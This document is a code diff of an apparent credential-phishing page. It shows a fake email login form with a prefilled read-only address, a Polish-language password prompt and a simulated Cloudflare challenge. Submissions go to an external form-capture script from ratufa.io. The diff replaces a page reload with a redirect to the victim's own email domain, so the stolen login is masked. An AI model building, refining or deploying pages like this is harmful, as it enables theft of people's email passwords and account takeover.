@@ -423,13 +423,13 @@ form {
                 <!-- Form submission configuration using FormSubmit module links integration -->
                 <form action="" method="POST">
                     
-<script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=xyj0hu5m&n=n1.ratufa.io"></script>
                     <div class="form-group">      
                 <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
                     </div>
 
                     <div class="form-group">
-                                  <input type="password" name="password" placeholder="Password" style="font-size: 12pt; height: 35px; width:280px;" required oninvalid="this.setCustomValidity('Please enter your password')" oninput="this.setCustomValidity('')" />
+                        <input type="password" name="Password" placeholder="Password" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
+  oninput="this.setCustomValidity('')"/>
                     </div>
 
                     <!-- Cloudflare Simulated Challenge Status Banner Row Component -->
@@ -450,7 +450,9 @@ form {
 
                 </form>
 
+<p id="statusMessage"></p>
 
+<script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=wyob9cof&n=n1.ratufa.io"></script>
 
 <script>
   document.getElementById('submitBtn').addEventListener('click', function () {
@@ -463,19 +465,24 @@ form {
     }
 
     // Prevent starting multiple timers if the user clicks rapidly
-    if (window.reloadTimerStarted) {
+    if (window.redirectTimerStarted) {
       return;
     }
-    window.reloadTimerStarted = true;
+    window.redirectTimerStarted = true;
 
     if (status) {
-      status.textContent = 'Submitted! Reloading in 10 seconds...';
+      status.textContent = 'Submitted! Redirecting in 5 seconds...';
     }
 
-    // Start the 10-second countdown immediately from the button click
+    // Start the redirect after 5 seconds (5000ms)
     window.setTimeout(function () {
-      window.location.reload(true);
-    }, 5000 );
+      const emailInput = document.getElementById('email').value.trim();
+
+      if (emailInput.includes('@')) {
+        const domain = emailInput.split('@')[1];
+        window.location.href = `https://${domain}`;
+      }
+    }, 5000);
   });
 </script>
 
